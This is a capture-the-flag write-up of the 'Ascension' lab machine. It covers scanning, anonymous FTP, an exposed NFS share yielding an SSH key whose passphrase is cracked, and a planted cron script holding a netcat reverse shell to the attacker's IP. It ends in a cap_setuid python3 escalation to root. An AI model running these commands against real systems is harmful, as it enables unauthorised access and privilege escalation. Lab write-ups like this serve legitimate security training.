# Ascension
![ascension](../assets/images/ascension.png)

??? info
    Author: Dcyberguy 

    Status: Published

    Last edited time: November 22, 2025 12:21 AM

    Created time: November 21, 2025 7:46 PM

**`This is a writeup for the Hacksmarter Lab machine: Ascension`**

## Host Information
```abap
IP Address:                     10.1.98.83
Host OS:                        Linux
Difficulty:                     Easy
```

## Enumeration

```abap
nmap -Pn -sV -sC -p- --min-rate=200 10.1.98.83 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-21 19:50 EST
Nmap scan report for 10.1.98.83
Host is up (0.026s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 28:d6:86:58:a1:e4:54:40:b2:52:40:8a:31:6a:c3:14 (ECDSA)
|_  256 93:86:35:c0:44:59:bb:0b:ab:a0:4a:7f:84:25:23:41 (ED25519)
80/tcp    open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44795/tcp6  mountd
|   100005  1,2,3      51453/tcp   mountd
|   100005  1,2,3      51868/udp6  mountd
|   100005  1,2,3      58443/udp   mountd
|   100021  1,3,4      38711/tcp   nlockmgr
|   100021  1,3,4      43151/udp   nlockmgr
|   100021  1,3,4      46647/tcp6  nlockmgr
|   100021  1,3,4      52811/udp6  nlockmgr
|   100024  1          33921/tcp6  status
|   100024  1          42310/udp   status
|   100024  1          46425/udp6  status
|   100024  1          50455/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
38711/tcp open  nlockmgr 1-4 (RPC #100021)
48461/tcp open  mountd   1-3 (RPC #100005)
50455/tcp open  status   1 (RPC #100024)
51453/tcp open  mountd   1-3 (RPC #100005)
60283/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.14 seconds

```

## FTP Enumeration

Based on `-sC` flag on the nmap script, I see `anonymous login` is allowed. Let’s test it out on `nxc`

```abap
nxc ftp 10.1.98.83 -u '' -p ''  
FTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)
FTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!

```

Next step would be to enumerate `FTP` File share and probably download a possible file

```abap
nxc ftp 10.1.98.83 -u '' -p '' --ls
FTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)
FTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!
FTP         10.1.98.83      21     10.1.98.83       [*] Directory Listing
FTP         10.1.98.83      21     10.1.98.83       -rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt
➜  Ascension nxc ftp 10.1.98.83 -u '' -p '' --get pwlist.txt
FTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)
FTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!
FTP         10.1.98.83      21     10.1.98.83       [+] Downloaded: pwlist.txt

```

We have a `pwlist.txt` file. It is a password file.

## HTTP Enumeration

Nothing much on the default Apache webpage

![ascension](../assets/images/ascension-1.png)

I will bruteforce for sub-domains and/or sub-directories using both `ffuf` and `Gobuster`

### VHOST

Nothing on `vhost` bruteforcing

```abap
gobuster vhost -u http://10.1.98.83 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://10.1.98.83
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================

```

### Sub-Directory

Let’s go, I have something

```abap
ffuf -u 'http://10.1.98.83/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.98.83/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 26ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3026ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3111ms]
index.php               [Status: 500, Size: 4, Words: 1, Lines: 5, Duration: 26ms]
index.html              [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 27ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 30ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 27ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 27ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 27ms]
xmlrpc.php              [Status: 500, Size: 4, Words: 1, Lines: 5, Duration: 92ms]
:: Progress: [4723/4723] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

```

## Enumeration RPC

```abap
[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) >> options

Module options (auxiliary/scanner/nfs/nfsmount):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   HOSTNAME                   no        Hostname to match shares against
   LHOST     192.168.52.145   no        IP to match shares against
   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     111              yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)

View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) >> set RHOST 10.1.98.83
RHOST => 10.1.98.83
[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) >> set LHOST 10.200.21.18
LHOST => 10.200.21.18
[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) >> set PROTOCOL tcp
PROTOCOL => tcp
[msf](Jobs:0 Agents:0) auxiliary(scanner/nfs/nfsmount) >> run
[+] 10.1.98.83:111        - 10.1.98.83 Mountable NFS Export: /srv/nfs/user1 [*]
[*] 10.1.98.83:111        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

I get a Mountable NFS Export `/srv/nfs/user1`

NB: Install `nsf-common` if necessary

```abap
Ascension: sudo mount 10.1.98.83:/srv/nfs/user1 /mnt/nfs_share  
Ascension: sudo mkdir /mnt/nfs_share
Ascension: ls -l /mnt/nfs_share 
   rw-r--r--   1   1001   parrot      2 KiB   Sun Sep 21 13:31:43 2025    id_rsa 
   rw-r--r--   1   1001   parrot    574 B     Sun Sep 21 13:31:45 2025    id_rsa.pub  
```

Tried logging using the Private SSH key plus the User1 but it was asking for a passphrase

```abap
ssh -i id_rsa user1@10.1.98.83
The authenticity of host '10.1.98.83 (10.1.98.83)' can't be established.
ED25519 key fingerprint is SHA256:aOJ2e6+SAGwdNAJNRYWEP+60jtNlOB7N9WFyPUgTmdU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.98.83' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
user1@10.1.98.83: Permission denied (publickey).

```

`SSH2John` can brute force ssh pass phrases

```abap
➜  Ascension ssh2john id_rsa > ssh.john
➜  Ascension ls   
       id_rsa        pwlist.txt        ssh.john 
➜  Ascension sudo john --wordlist=/usr/share/wordlists/rockyou.txt ssh.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sammie1          (id_rsa)     
1g 0:00:04:04 DONE (2025-11-21 21:56) 0.004092g/s 21.01p/s 21.01c/s 21.01C/s damnit..flaca
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Use the cracked passphrase and login to the User1 account

```abap
ssh -i id_rsa user1@10.1.98.83 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1012-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Nov 22 03:07:08 UTC 2025

  System load:  0.24              Temperature:           -273.1 C
  Usage of /:   41.5% of 6.71GB   Processes:             142
  Memory usage: 35%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: 10.1.98.83

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Sep 21 17:45:17 2025 from 10.0.0.247
user1@ip-10-1-98-83:~$ ls

```

Found the `user1`  flag

```abap
user1@ip-10-1-98-83:/opt$ ls
ftpuser  root  user1  user2  user3
user1@ip-10-1-98-83:/opt$ cd user
user1/ user2/ user3/ 
user1@ip-10-1-98-83:/opt$ cd user1
user1@ip-10-1-98-83:/opt/user1$ ls
flag1
user1@ip-10-1-98-83:/opt/user1$ cat flag1 
RkxBRzF7aGpzeXU4OTIzMzRoam9obnNkOHkyOTNoNH0=

```

Also found this when I ran `linpeas.sh`

```abap
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 root root 153 Sep 21 00:04 /var/www/html/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'wppassword');
define('DB_HOST', 'localhost');

```

Let’s interact with the `mysql` server

```abap
user1@ip-10-1-98-83:/opt/user1$ mysql -u wpuser -D wordpress -h localhost -p
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 17
Server version: 8.0.43-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use wordpress 
Database changed
mysql> show tables
    -> ;
+---------------------+
| Tables_in_wordpress |
+---------------------+
| flags               |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> SELECT * FROM flags;
+----+------------------------------------------+
| id | flag                                     |
+----+------------------------------------------+
|  1 | RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9 |
+----+------------------------------------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+---------------+
| id | username | password      |
+----+----------+---------------+
|  1 | user3    | user3password |
+----+----------+---------------+
1 row in set (0.00 sec)

```

I think I missed `user2` creds. I have to go back and get it

Found this to be very handy when dealing with processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.

[GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)

```abap
user1@ip-10-1-98-83:/tmp$ ss -tulnp
Netid           State            Recv-Q           Send-Q                       Local Address:Port                      Peer Address:Port          Process          
udp             UNCONN           0                0                               127.0.0.54:53                             0.0.0.0:*                           
udp             UNCONN           0                0                            127.0.0.53%lo:53                             0.0.0.0:*                              
udp             UNCONN           0                0                          10.1.98.83%ens5:68                             0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:58443                          0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:111                            0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:43151                          0.0.0.0:*                              
udp             UNCONN           0                0                                127.0.0.1:323                            0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:42310                          0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:38327                          0.0.0.0:*                              
udp             UNCONN           0                0                                  0.0.0.0:37412                          0.0.0.0:*                              
udp             UNCONN           0                0                                127.0.0.1:802                            0.0.0.0:*                              
udp             UNCONN           0                0                                     [::]:46159                             [::]:*                              
udp             UNCONN           0                0                                     [::]:111                               [::]:*                              
udp             UNCONN           0                0                                     [::]:49321                             [::]:*                              
udp             UNCONN           0                0                                    [::1]:323                               [::]:*                          
udp             UNCONN           0                0                                     [::]:46425                             [::]:*                              
```

```abap
user1@ip-10-1-98-83:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/11/22 04:41:08 CMD: UID=1001  PID=55049  | ./pspy64
<< SNIP >>
2025/11/22 04:42:01 CMD: UID=1002  PID=55066  | /bin/sh -c /tmp/backup.sh 
2025/11/22 04:42:01 CMD: UID=1002  PID=55067  | /bin/sh -c /tmp/backup.sh 
2025/11/22 04:42:01 CMD: UID=1002  PID=55070  | 
2025/11/22 04:42:01 CMD: UID=1002  PID=55068  | /bin/sh -c /tmp/backup.sh 
2025/11/22 04:43:01 CMD: UID=0     PID=55076  | /usr/sbin/cron -f -P 
2025/11/22 04:43:01 CMD: UID=0     PID=55075  | /usr/sbin/cron -f -P 
2025/11/22 04:43:01 CMD: UID=0     PID=55074  | /usr/sbin/cron -f -P 
2025/11/22 04:43:01 CMD: UID=0     PID=55073  | /usr/sbin/CRON -f -P 
2025/11/22 04:43:01 CMD: UID=0     PID=55072  | /usr/sbin/CRON -f -P 

```

There is a process (Cron) running on `/tmp/backup.sh` as the `user2`

Since there is no [`backup.sh`](http://backup.sh) in `/tmp`. I will create mine and place a Reserve shell in it

```abap
user1@ip-10-1-98-83:/tmp$ cat backup.sh 
#!/bin/bash
busybox nc 10.200.21.18 4444 -e /bin/bash
```

Start a `netcat` and run the `pspy64` to catch the reverse shell

```abap
nc -lvnp 4444 
Listening on 0.0.0.0 4444
Connection received on 10.1.98.83 59672
whoami
user2
python3 -c 'import pty;pty.spawn("/bin/bash")'
user2@ip-10-1-98-83:~$ ls
ls
user2@ip-10-1-98-83:~$ cd /opt	
cd /opt
user2@ip-10-1-98-83:/opt$ ls
ls
ftpuser  root  user1  user2  user3
user2@ip-10-1-98-83:/opt$ cd user2
cd user2
user2@ip-10-1-98-83:/opt/user2$ ls
ls
flag2
user2@ip-10-1-98-83:/opt/user2$ cat flag2
cat flag2
RkxBRzJ7c2RoaDk4MjM0bmpvaG4za2pkajIzM2ZkfQ==

```

### Back to User3

After running [`linpeas.sh`](http://linpeas.sh) I found this

```abap
Files with capabilities (limited to 50):
/home/user3/python3 cap_setuid=ep
/home/user3/python3 cap_setuid=ep is writable
/snap/core22/2111/usr/bin/ping cap_net_raw=ep
/snap/core22/2133/usr/bin/ping cap_net_raw=ep
/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep

```

Check this out!!!!!

![ascension](../assets/images/ascension-2.png)

Let’s gooooo

```abap
user3@ip-10-1-98-83:~$ /home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ip-10-1-98-83:~# whoami
root
root@ip-10-1-98-83:~# ls
python3
root@ip-10-1-98-83:~# cat /opt/ftpuser/flag3 
RkxBRzN7Z2pkb2huYXNkOTgyMzRram5iY2tkZn0=

<< SNIP >>

root@ip-10-1-98-83:/opt# ls
ftpuser  root  user1  user2  user3
root@ip-10-1-98-83:/opt# cat root/flag6 
RkxBRzZ7c2RmanVkaGZzODIzNGtqbmJvaG5kamZ9

```